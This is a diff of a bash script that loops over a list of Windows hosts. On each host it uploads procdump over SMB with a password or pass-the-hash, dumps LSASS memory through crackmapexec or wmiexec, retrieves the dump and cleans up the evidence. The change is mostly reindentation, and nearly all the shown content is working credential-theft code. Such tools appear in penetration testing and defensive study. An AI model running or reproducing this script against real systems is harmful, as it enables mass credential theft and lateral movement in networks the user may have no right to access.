@@ -115,46 +115,46 @@ fi
 # Push it. Dump it. Get it. Remove it.
 for TARGETIP in `cat $HOSTFILE`
 do
-    echo "===| Connecting to $TARGETIP and uploading $PROCDUMP! |==="
+	echo "===| Connecting to $TARGETIP and uploading $PROCDUMP! |==="
 	if [ -z ${PASSWORD+x} ]; then
     	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "put $PROCDUMP procdump.exe"
     else
 		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "put $PROCDUMP procdump.exe"
 	fi
 	echo
-    echo "===| Dumping memory on $TARGETIP! |==="
-        if [ "$METHOD" == "crackmapexec" ] || [ "$DOMAIN" == "."  ]; then
-            if [ -z ${PASSWORD+x} ]; then
-                    $CRACK $TARGETIP -u $USERNAME -H $HASH --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
-            else
-                    $CRACK $TARGETIP -u $USERNAME -p $PASSWORD --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
-            fi
-        elif [ "$METHOD" == "crackmapexec" ] || ["$DOMAIN" != "." ]; then
-            if [ -z ${PASSWORD+x} ]; then
-                    $CRACK $TARGETIP -u $USERNAME -H $HASH -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
-            else
-                    $CRACK $TARGETIP -u $USERNAME -p $PASSWORD -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
-            fi
-        elif [ "$METHOD" == "wmiexec" ]; then
-            python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGETIP" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
+	echo "===| Dumping memory on $TARGETIP! |==="
+	if [ "$METHOD" == "crackmapexec" ] || [ "$DOMAIN" == "."  ]; then
+		if [ -z ${PASSWORD+x} ]; then
+            $CRACK $TARGETIP -u $USERNAME -H $HASH --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
+		else
+			$CRACK $TARGETIP -u $USERNAME -p $PASSWORD --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
+		fi
+	elif [ "$METHOD" == "crackmapexec" ] || ["$DOMAIN" != "." ]; then
+		if [ -z ${PASSWORD+x} ]; then
+			$CRACK $TARGETIP -u $USERNAME -H $HASH -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
+		else
+			$CRACK $TARGETIP -u $USERNAME -p $PASSWORD -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
         fi
-    echo
-    echo "===| Retrieving the dump... Muh dumps, muh dumps. Muh lovely LSASS dumps! |==="
+	elif [ "$METHOD" == "wmiexec" ]; then
+        	python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGETIP" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
+    fi
+	echo
+	echo "===| Retrieving the dump... Muh dumps, muh dumps. Muh lovely LSASS dumps! |==="
 	if [ -z ${PASSWORD+x} ]; then
-    	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "get lsass.dmp lsass-$TARGETIP.dmp"
+		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "get lsass.dmp lsass-$TARGETIP.dmp"
 	else
 		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "get lsass.dmp lsass-$TARGETIP.dmp"
 	fi
-    echo
-    echo "===| Check it out! |==="
-    echo "> DUMP SAVED IN CURRENT FOLDER AS: lsass-$TARGETIP.dmp"
-    echo
-    echo "===| And... Cleaning up! |==="
+	echo
+	echo "===| Check it out! |==="
+	echo "> DUMP SAVED IN CURRENT FOLDER AS: lsass-$TARGETIP.dmp"
+	echo
+	echo "===| And... Cleaning up! |==="
 	if [ -z ${PASSWORD+x} ]; then
-    	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "rm procdump.exe;rm lsass.dmp"
+		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "rm procdump.exe;rm lsass.dmp"
 	else
 		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "rm procdump.exe;rm lsass.dmp"
 	fi
-    echo
-    echo
+	echo
+	echo
 done
